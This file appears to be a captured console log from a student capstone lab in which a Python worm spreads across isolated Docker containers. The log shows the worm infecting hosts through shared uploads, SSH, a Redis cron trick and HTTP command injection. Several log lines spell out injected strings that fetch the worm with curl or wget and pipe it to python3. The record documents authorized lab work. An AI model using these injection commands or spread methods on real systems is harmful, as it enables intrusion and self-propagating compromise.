@@ -1,0 +1,480 @@
+
+[1m[0;36m╔══════════════════════════════════════════════════════════════╗[0m
+[1m[0;36m║       DockerWormNetwork — Worm Deployment Console            ║[0m
+[1m[0;36m║       CS 499 Capstone  ·  Auth ID: ticq7                     ║[0m
+[1m[0;36m╚══════════════════════════════════════════════════════════════╝[0m
+[0;36m  Strategy : [1mrandom[0m
+[0;36m  Log      : /home/greenballoons/499/DockerWormNetwork/logs/worm_run_20260505_144714.log[0m
+[0;36m  Time     : Tue May  5 02:47:14 PM EDT 2026[0m
+
+[0;32m[✓] Lab is running[0m
+[0;32m[✓] worm.py found[0m
+
+[1m[0;35m[STAGE 1/3] Authentication[0m
+[0;35m────────────────────────────────────────[0m
+[0;32m[✓] Authenticated as admin (HTTP 302)[0m
+
+[1m[0;35m[STAGE 2/3] Worm Deployment[0m
+[0;35m────────────────────────────────────────[0m
+[0;32m[✓] worm.py staged in api:/uploads/[0m
+[0;32m[✓] Worm launched — strategy: [1mrandom[0m
+
+[1m[0;35m[STAGE 3/3] Live Monitoring Dashboard[0m
+[0;35m────────────────────────────────────────[0m
+[0;33m[*] Strategy : random[0m
+[0;33m[*] Watching for infection events (🦠) and exploits (💀)[0m
+[0;33m[*] Infection summary prints every 30s[0m
+[0;33m[*] Press Ctrl+C to stop[0m
+
+
+══════════════════════════════════════════════════════════════════════
+  [1mMISSION CONTROL — DockerWormNetwork[0m
+  CS 499 Capstone  │  Authorized Lab (ID: ticq7)
+  Containers: api · webserver · victim · db · dns · fileshare
+              redis · postgres · jumpbox · traffic_gen
+  Ctrl+C to exit
+══════════════════════════════════════════════════════════════════════
+
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'api'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'webserver'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'victim'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'db'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'redis'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'postgres'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'jumpbox'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'dns'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'fileshare'
+14:47:23 │ [37mSYSTEM      [0m │ 📡 Attached to 'traffic_gen'
+14:47:23 │ [92mwebserver   [0m │ /bin/sh: 1: ping: not found
+14:47:23 │ [92mwebserver   [0m │ /bin/sh: 1: curl: not found
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.10 - - [05/May/2026 18:04:53] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:06:22] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:07:14] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:09:05] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:12:09] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:13:04] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:15:13] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:19:39] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:19:43] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:22:23] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:22:38] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:23:10] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:24:12] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:24:22] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:25:30] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:28:51] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:33:25] "GET / HTTP/1.1" 200 -
+14:47:23 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:45:21] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 17:49:48] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 17:51:50] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 17:54:50] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 17:56:09] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:01:56] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:03:38] code 404, message File not found
+14:47:23 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:03:38] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 404 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:03:38] "GET /?q=;wget%20-qO-%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:04:15] code 404, message File not found
+14:47:23 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:04:15] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 404 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:04:15] "GET /?q=;wget%20-qO-%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:07:05] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:12:37] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:15:26] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:18:48] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:23:31] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:26:27] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:27:29] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:28:27] "GET / HTTP/1.1" 200 -
+14:47:23 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:32:59] "GET / HTTP/1.1" 200 -
+14:47:23 │ [95mpostgres    [0m │ server started
+14:47:23 │ [95mpostgres    [0m │ /usr/local/bin/docker-entrypoint.sh: ignoring /docker-entrypoint-initdb.d/*
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.146 UTC [47] LOG:  received fast shutdown request
+14:47:23 │ [95mpostgres    [0m │ waiting for server to shut down....2026-05-05 16:16:31.164 UTC [47] LOG:  aborting any active transactions
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.193 UTC [47] LOG:  background worker "logical replication launcher" (PID 54) exited with exit code 1
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.199 UTC [49] LOG:  shutting down
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.367 UTC [47] LOG:  database system is shut down
+14:47:23 │ [95mpostgres    [0m │ done
+14:47:23 │ [95mpostgres    [0m │ server stopped
+14:47:23 │ [95mpostgres    [0m │ PostgreSQL init process complete; ready for start up.
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.763 UTC [1] LOG:  starting PostgreSQL 13.23 (Debian 13.23-1.pgdg13+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 14.2.0-19) 14.2.0, 64-bit
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.765 UTC [1] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.765 UTC [1] LOG:  listening on IPv6 address "::", port 5432
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.789 UTC [1] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.825 UTC [60] LOG:  database system was shut down at 2026-05-05 16:16:31 UTC
+14:47:23 │ [95mpostgres    [0m │ 2026-05-05 16:16:31.894 UTC [1] LOG:  database system is ready to accept connections
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:46:49] "[32mGET /logout HTTP/1.1[0m" 302 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:46:49] "GET /login HTTP/1.1" 200 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:01] "[32mPOST /login HTTP/1.1[0m" 302 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:01] "GET / HTTP/1.1" 200 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:01] "GET / HTTP/1.1" 200 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:01] "[32mGET /logout HTTP/1.1[0m" 302 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:01] "GET /login HTTP/1.1" 200 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:07] "[32mGET / HTTP/1.1[0m" 302 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:07] "GET /login?next=/ HTTP/1.1" 200 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:12] "GET /login HTTP/1.1" 200 -
+14:47:23 │ [94mapi         [0m │ 172.20.0.1 - - [05/May/2026 18:47:18] "[32mPOST /login HTTP/1.1[0m" 302 -
+14:47:23 │ [94mapi         [0m │ [SYSTEM] Worm worm.py executed by admin — strategy=random
+14:47:23 │ [94mapi         [0m │ 172.20.0.1 - - [05/May/2026 18:47:19] "POST /exec HTTP/1.1" 200 -
+14:47:23 │ [94mapi         [0m │ [1m[*] 🪱 DYNAMIC WORM → 716e0bc43951 → SELF_IP=172.20.0.10 → strategy=random[0m
+14:47:23 │ [94mapi         [0m │ [1m[*] 🌐 DEPLOYMENT → SELF_IP=172.20.0.10 → 1 subnets[0m
+14:47:23 │ [94mapi         [0m │ [1m[*] ✓ LAB_MODE=1 — authorized lab environment, skipping isolation check[0m
+14:47:23 │ [94mapi         [0m │ [1m[+] ✅ Persisted to /tmp/worm.py[0m
+14:47:23 │ [94mapi         [0m │ [1m[*] 🎯 Drop server running at http://172.20.0.10:8080/worm.py[0m
+14:47:23 │ [94mapi         [0m │ [📋] Logged infection: 172.20.0.7 via SharedFS at 0.03s
+14:47:23 │ [94mapi         [0m │ [1m[+] SharedFS→172.20.0.7 Infected via /uploads[0m
+14:47:23 │ [96mdns         [0m │ [webserver] Ping request for IP: ;curl http://172.20.0.10:8080/worm.py|python3
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: ping: not found
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: curl: not found
+14:47:23 │ [96mdns         [0m │ 172.20.0.10 - - [05/May/2026 17:18:15] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:23 │ [96mdns         [0m │ [webserver] Ping request for IP: ;curl http://172.20.0.10:8080/worm.py|python3
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: ping: not found
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: curl: not found
+14:47:23 │ [96mdns         [0m │ 172.20.0.10 - - [05/May/2026 17:18:15] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:23 │ [96mdns         [0m │ [webserver] Ping request for IP: ;curl http://172.20.0.10:8080/worm.py|python3
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: ping: not found
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: curl: not found
+14:47:23 │ [96mdns         [0m │ 172.20.0.10 - - [05/May/2026 17:39:41] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:23 │ [96mdns         [0m │ [webserver] Ping request for IP: ;curl http://172.20.0.10:8080/worm.py|python3
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: ping: not found
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: curl: not found
+14:47:23 │ [96mdns         [0m │ 172.20.0.10 - - [05/May/2026 17:39:41] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:23 │ [96mdns         [0m │ [webserver] Ping request for IP: ;curl http://172.20.0.10:8080/worm.py|python3
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: ping: not found
+14:47:23 │ [96mdns         [0m │ /bin/sh: 1: curl: not found
+14:47:23 │ [96mdns         [0m │ 172.20.0.10 - - [05/May/2026 18:03:38] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:24 │ [33mjumpbox     [0m │ Creating SSH2 ECDSA key; this may take some time ...
+14:47:24 │ [33mjumpbox     [0m │ 256 SHA256:che3TqzgHhUGSoIwMseKDDvKGzoARFyzWxfsRxFgUz8 root@39c91c21f032 (ECDSA)
+14:47:24 │ [33mjumpbox     [0m │ Creating SSH2 ED25519 key; this may take some time ...
+14:47:24 │ [33mjumpbox     [0m │ 256 SHA256:qqXzNQSW5KewKam/erkLGP8LiCjxPkiP67fPj5rH5y0 root@39c91c21f032 (ED25519)
+14:47:24 │ [33mjumpbox     [0m │ Creating user 'sshd' (sshd user) with UID 995 and GID 65534.
+14:47:24 │ [33mjumpbox     [0m │ runit: ssh: start action denied by policy-rc.d
+14:47:24 │ [33mjumpbox     [0m │ invoke-rc.d: could not determine current runlevel
+14:47:24 │ [33mjumpbox     [0m │ invoke-rc.d: policy-rc.d denied execution of start.
+14:47:24 │ [33mjumpbox     [0m │ Created symlink '/etc/systemd/system/sshd.service' → '/usr/lib/systemd/system/ssh.service'.
+14:47:24 │ [33mjumpbox     [0m │ Created symlink '/etc/systemd/system/multi-user.target.wants/ssh.service' → '/usr/lib/systemd/system/ssh.service'.
+14:47:24 │ [33mjumpbox     [0m │ Created symlink '/etc/systemd/system/ssh.service.wants/sshd-keygen.service' → '/usr/lib/systemd/system/sshd-keygen.service'.
+14:47:24 │ [91mredis       [0m │ 1:C 05 May 2026 16:16:09.425 # oO0OoO0OoO0Oo Redis is starting oO0OoO0OoO0Oo
+14:47:24 │ [33mjumpbox     [0m │ Created symlink '/etc/systemd/system/sshd.service.wants/sshd-keygen.service' → '/usr/lib/systemd/system/sshd-keygen.service'.
+14:47:24 │ [91mredis       [0m │ 1:C 05 May 2026 16:16:09.426 # Redis version=6.2.21, bits=64, commit=00000000, modified=0, pid=1, just started
+14:47:24 │ [33mjumpbox     [0m │ Created symlink '/etc/systemd/system/sshd@.service.wants/sshd-keygen.service' → '/usr/lib/systemd/system/sshd-keygen.service'.
+14:47:24 │ [91mredis       [0m │ 1:C 05 May 2026 16:16:09.426 # Configuration loaded
+14:47:24 │ [33mjumpbox     [0m │ Created symlink '/etc/systemd/system/ssh.socket.wants/sshd-keygen.service' → '/usr/lib/systemd/system/sshd-keygen.service'.
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 16:16:09.446 * Increased maximum number of open files to 10032 (it was originally set to 1024).
+14:47:24 │ [33mjumpbox     [0m │ Setting up dmsetup (2:1.02.205-2) ...
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 16:16:09.447 * monotonic clock: POSIX clock_gettime
+14:47:24 │ [33mjumpbox     [0m │ Setting up libdevmapper1.02.1:amd64 (2:1.02.205-2) ...
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 16:16:09.458 * Running mode=standalone, port=6379.
+14:47:24 │ [33mjumpbox     [0m │ Setting up libcryptsetup12:amd64 (2:2.7.5-2) ...
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 16:16:09.459 # Server initialized
+14:47:24 │ [33mjumpbox     [0m │ Setting up systemd-cryptsetup (257.9-1~deb13u1) ...
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 16:16:09.459 # WARNING Memory overcommit must be enabled! Without it, a background save or replication may fail under low memory condition. Being disabled, it can can also cause failures without low memory condition, see https://github.com/jemalloc/jemalloc/issues/1328. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
+14:47:24 │ [33mjumpbox     [0m │ Processing triggers for libc-bin (2.41-12) ...
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 16:16:09.471 * Ready to accept connections
+14:47:24 │ [33mjumpbox     [0m │ Processing triggers for systemd (257.9-1~deb13u1) ...
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 17:16:10.088 * 1 changes in 3600 seconds. Saving...
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 17:16:10.092 * Background saving started by pid 20
+14:47:24 │ [91mredis       [0m │ 20:C 05 May 2026 17:16:10.115 * DB saved on disk
+14:47:24 │ [91mredis       [0m │ 20:C 05 May 2026 17:16:10.124 * RDB: 0 MB of memory used by copy-on-write
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 17:16:10.196 * Background saving terminated with success
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 17:18:14.848 * DB saved on disk
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 17:18:15.003 * DB saved on disk
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 17:39:40.316 * DB saved on disk
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 17:39:41.512 * DB saved on disk
+14:47:24 │ [91mredis       [0m │ 1:M 05 May 2026 18:03:50.905 * DB saved on disk
+14:47:24 │ [94mapi         [0m │ [1m[*] 🔍 Scanning 266 hosts (max 10 cycles)...[0m
+14:47:24 │ [94mapi         [0m │ [1m[*] === CYCLE 1/10 ===[0m
+14:47:26 │ [94mapi         [0m │ [1m[+] 🎯 3 hosts with open ports[0m
+14:47:26 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1mdns[0m
+14:47:26 │ [94mapi         [0m │ [1m[>] 🦠 Infecting dns → ports [9000][0m
+14:47:26 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1m172.20.0.5[0m
+14:47:26 │ [94mapi         [0m │ [1m[>] 🦠 Infecting 172.20.0.5 → ports [22][0m
+14:47:26 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1m127.0.0.1[0m
+14:47:26 │ [94mapi         [0m │ [1m[>] 🦠 Infecting 127.0.0.1 → ports [8080][0m
+14:47:26 │ [94mapi         [0m │ [1m[+] 3 new infection attempts[0m
+14:47:26 │ [96mdns         [0m │ [webserver] Ping request for IP: ;curl http://172.20.0.10:8080/worm.py|python3
+14:47:26 │ [96mdns         [0m │ /bin/sh: 1: ping: not found
+14:47:26 │ [96mdns         [0m │ /bin/sh: 1: curl: not found
+14:47:26 │ [1;31mWORM        [0m │ 💀 PWNED via HTTP RCE → [1m127.0.0.1[0m
+14:47:26 │ [94mapi         [0m │ [1m[+] HTTP→127.0.0.1:8080 payload delivered[0m
+14:47:26 │ [94mapi         [0m │ [📋] Logged infection: 127.0.0.1 via HTTP RCE at 4.81s
+14:47:27 │ [96mdns         [0m │ 172.20.0.10 - - [05/May/2026 18:47:27] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:27 │ [1;31mWORM        [0m │ 💀 PWNED via HTTP RCE → [1mdns[0m
+14:47:27 │ [94mapi         [0m │ [1m[+] HTTP→dns:9000 payload delivered[0m
+14:47:27 │ [94mapi         [0m │ [📋] Logged infection: dns via HTTP RCE at 5.03s
+14:47:34 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:34] "[32mPOST /login HTTP/1.1[0m" 302 -
+14:47:34 │ [94mapi         [0m │ /app/app.py:32: LegacyAPIWarning: The Query.get() method is considered legacy as of the 1.x series of SQLAlchemy and becomes a legacy construct in 2.0. The method is now available as Session.get() (deprecated since: 2.0) (Background on SQLAlchemy 2.0 at: https://sqlalche.me/e/b8d9)
+14:47:34 │ [94mapi         [0m │ return User.query.get(int(user_id))
+14:47:34 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:34] "GET / HTTP/1.1" 200 -
+14:47:34 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:34] "GET / HTTP/1.1" 200 -
+14:47:34 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:34] "[32mGET /logout HTTP/1.1[0m" 302 -
+14:47:34 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:47:34] "GET /login HTTP/1.1" 200 -
+14:47:36 │ [94mapi         [0m │ [1m[*] === CYCLE 2/10 ===[0m
+14:47:37 │ [1;31mWORM        [0m │ 💀 PWNED via SSH → [1m172.20.0.5[0m
+14:47:37 │ [94mapi         [0m │ [1m[+] SSH→172.20.0.5:ubuntu Infected[0m
+14:47:37 │ [94mapi         [0m │ [📋] Logged infection: 172.20.0.5 via SSH at 15.72s
+14:47:39 │ [94mapi         [0m │ [1m[+] 🎯 2 hosts with open ports[0m
+14:47:39 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1mapi[0m
+14:47:39 │ [94mapi         [0m │ [1m[>] 🦠 Infecting api → ports [8080][0m
+14:47:39 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1m172.20.0.3[0m
+14:47:39 │ [94mapi         [0m │ [1m[>] 🦠 Infecting 172.20.0.3 → ports [6379][0m
+14:47:39 │ [94mapi         [0m │ [1m[+] 2 new infection attempts[0m
+14:47:39 │ [1;31mWORM        [0m │ 💀 PWNED via HTTP RCE → [1mapi[0m
+14:47:39 │ [94mapi         [0m │ [1m[+] HTTP→api:8080 payload delivered[0m
+14:47:39 │ [94mapi         [0m │ [📋] Logged infection: api via HTTP RCE at 17.39s
+14:47:39 │ [91mredis       [0m │ 1:M 05 May 2026 18:47:39.840 * DB saved on disk
+14:47:39 │ [1;31mWORM        [0m │ 💀 PWNED via Redis → [1m172.20.0.3[0m
+14:47:39 │ [94mapi         [0m │ [1m[+] Redis→172.20.0.3:6379 Infected (Cron Exploit)[0m
+14:47:39 │ [94mapi         [0m │ [📋] Logged infection: 172.20.0.3 via Redis at 17.75s
+14:47:41 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:47:41] "GET / HTTP/1.1" 200 -
+14:47:49 │ [94mapi         [0m │ [1m[*] === CYCLE 3/10 ===[0m
+14:47:51 │ [94mapi         [0m │ [1m[+] 🎯 2 hosts with open ports[0m
+14:47:51 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1mvictim[0m
+14:47:51 │ [94mapi         [0m │ [1m[>] 🦠 Infecting victim → ports [8888][0m
+14:47:51 │ [94mapi         [0m │ [1m[+] 1 new infection attempts[0m
+14:47:52 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:47:52] code 404, message File not found
+14:47:52 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:47:52] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 404 -
+14:47:52 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:47:52] "GET /?q=;wget%20-qO-%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:47:52 │ [1;31mWORM        [0m │ 💀 PWNED via HTTP RCE → [1mvictim[0m
+14:47:52 │ [94mapi         [0m │ [1m[+] HTTP→victim:8888 payload delivered[0m
+14:47:52 │ [94mapi         [0m │ [📋] Logged infection: victim via HTTP RCE at 29.92s
+
+────────────────────────── [1mINFECTION STATUS[0m ──────────────────────────
+
+  Worm status  : [1;31mACTIVE[0m   Cycle: [1m3[0m
+  Infected (6) : [1;31m127.0.0.1, 172.20.0.3, 172.20.0.5, api, dns, victim[0m
+  Recent events:
+    [2m14:47:39[0m  172.20.0.3           via attempting
+    [2m14:47:39[0m  api                  via HTTP RCE
+    [2m14:47:39[0m  172.20.0.3           via Redis
+    [2m14:47:51[0m  victim               via attempting
+    [2m14:47:52[0m  victim               via HTTP RCE
+
+──────────────────────────────────────────────────────────────────────
+
+14:48:02 │ [94mapi         [0m │ [1m[*] === CYCLE 4/10 ===[0m
+14:48:04 │ [94mapi         [0m │ [1m[+] 🎯 2 hosts with open ports[0m
+14:48:04 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1m172.20.0.2[0m
+14:48:04 │ [94mapi         [0m │ [1m[>] 🦠 Infecting 172.20.0.2 → ports [8888][0m
+14:48:04 │ [94mapi         [0m │ [1m[+] 1 new infection attempts[0m
+14:48:04 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:48:04] code 404, message File not found
+14:48:04 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:48:04] "GET /ping?ip=;curl%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 404 -
+14:48:04 │ [93mvictim      [0m │ 172.20.0.10 - - [05/May/2026 18:48:04] "GET /?q=;wget%20-qO-%20http://172.20.0.10:8080/worm.py%7Cpython3 HTTP/1.1" 200 -
+14:48:04 │ [1;31mWORM        [0m │ 💀 PWNED via HTTP RCE → [1m172.20.0.2[0m
+14:48:04 │ [94mapi         [0m │ [1m[+] HTTP→172.20.0.2:8888 payload delivered[0m
+14:48:04 │ [94mapi         [0m │ [📋] Logged infection: 172.20.0.2 via HTTP RCE at 42.64s
+14:48:05 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:48:05] "GET /login HTTP/1.1" 200 -
+14:48:13 │ [92mwebserver   [0m │ 172.20.0.11 - - [05/May/2026 18:48:13] "GET / HTTP/1.1" 200 -
+14:48:14 │ [94mapi         [0m │ [1m[*] === CYCLE 5/10 ===[0m
+14:48:17 │ [94mapi         [0m │ [1m[+] 🎯 3 hosts with open ports[0m
+14:48:17 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1m172.20.0.8[0m
+14:48:17 │ [94mapi         [0m │ [1m[>] 🦠 Infecting 172.20.0.8 → ports [5432][0m
+14:48:17 │ [94mapi         [0m │ [1m[+] 1 new infection attempts[0m
+14:48:17 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:48:17] "GET /login HTTP/1.1" 200 -
+14:48:20 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:48:20] "GET /login HTTP/1.1" 200 -
+14:48:22 │ [94mapi         [0m │ 172.20.0.11 - - [05/May/2026 18:48:22] "GET /login HTTP/1.1" 200 -
+
+────────────────────────── [1mINFECTION STATUS[0m ──────────────────────────
+
+  Worm status  : [1;31mACTIVE[0m   Cycle: [1m5[0m
+  Infected (7) : [1;31m127.0.0.1, 172.20.0.2, 172.20.0.3, 172.20.0.5, api, dns, victim[0m
+  Recent events:
+    [2m14:47:51[0m  victim               via attempting
+    [2m14:47:52[0m  victim               via HTTP RCE
+    [2m14:48:04[0m  172.20.0.2           via attempting
+    [2m14:48:04[0m  172.20.0.2           via HTTP RCE
+    [2m14:48:17[0m  172.20.0.8           via attempting
+
+──────────────────────────────────────────────────────────────────────
+
+14:48:27 │ [94mapi         [0m │ [1m[*] === CYCLE 6/10 ===[0m
+14:48:29 │ [94mapi         [0m │ [1m[+] 🎯 1 hosts with open ports[0m
+14:48:29 │ [94mapi         [0m │ [1m[!] No new infections (stagnant: 1)[0m
+14:48:37 │ [93mvictim      [0m │ 172.20.0.11 - - [05/May/2026 18:48:37] "GET / HTTP/1.1" 200 -
+14:48:39 │ [94mapi         [0m │ [1m[*] === CYCLE 7/10 ===[0m
+14:48:41 │ [94mapi         [0m │ [1m[+] 🎯 3 hosts with open ports[0m
+14:48:41 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1m172.20.0.9[0m
+14:48:41 │ [94mapi         [0m │ [1m[>] 🦠 Infecting 172.20.0.9 → ports [9000][0m
+14:48:41 │ [1;31mWORM        [0m │ 🦠 INFECTING → [1mdb[0m
+14:48:41 │ [94mapi         [0m │ [1m[>] 🦠 Infecting db → ports [3306][0m
